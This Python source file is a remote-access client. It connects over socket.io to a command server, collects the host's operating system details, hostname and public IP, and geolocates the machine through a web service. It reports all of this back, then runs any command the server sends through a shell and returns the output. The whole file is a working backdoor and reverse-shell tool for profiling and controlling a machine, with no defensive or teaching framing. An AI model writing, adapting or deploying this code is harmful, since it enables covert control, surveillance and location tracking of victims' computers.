import socketio
import platform
import socket
import re
from urllib.request import urlopen
import subprocess
import pyautogui
import requests

io = socketio.Client()

io.connect("http://localhost:5678")


def on_connect():
    print("connected")


def on_disconnect():
    print("disconnected")


def sc():
    print("s")


def recv_data(data):
    out_put = ""
    result = subprocess.Popen(
        data,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.PIPE,
        shell=True,
    )
    out_put = result.stdout.read() + result.stderr.read()
    out_put = {data: str(out_put)}
    io.emit("send_data_command", out_put)


def TrackLocation(ip_address):
    response = requests.get("http://ip-api.com/json/{}".format(ip_address)).json()
    result = {}
    result["lat"] = response["lat"]
    result["lon"] = response["lon"]
    return result


def getIpAddressReal():
    try:
        source = urlopen("http://checkip.dyndns.com")
        data = str(source.read())
        ip_string = re.search(r"\d+\.\d+\.\d+\.\d+", data).group()
        return ip_string
    except Exception as err:
        pass


def information():
    system = str(platform.system())
    release = str(platform.release())
    version = str(platform.version())
    machine = str(platform.machine())
    uname = str(platform.uname().node)
    # win32_ver = str(platform.win32_ver()[2])
    ip = getIpAddressReal()
    lat_log = TrackLocation(ip)
    print(lat_log)
    result = []
    result.append(system)
    result.append(release)
    result.append(version)
    result.append(machine)
    result.append(uname)
    # result.append(win32_ver)
    result.append(ip)
    result.append(lat_log)
    return result


data = information()

io.emit("information", {"data": data})
io.on("server_send_command", recv_data)
io.on("connection", on_connect)
io.on("disconnect", on_disconnect)


io.wait()
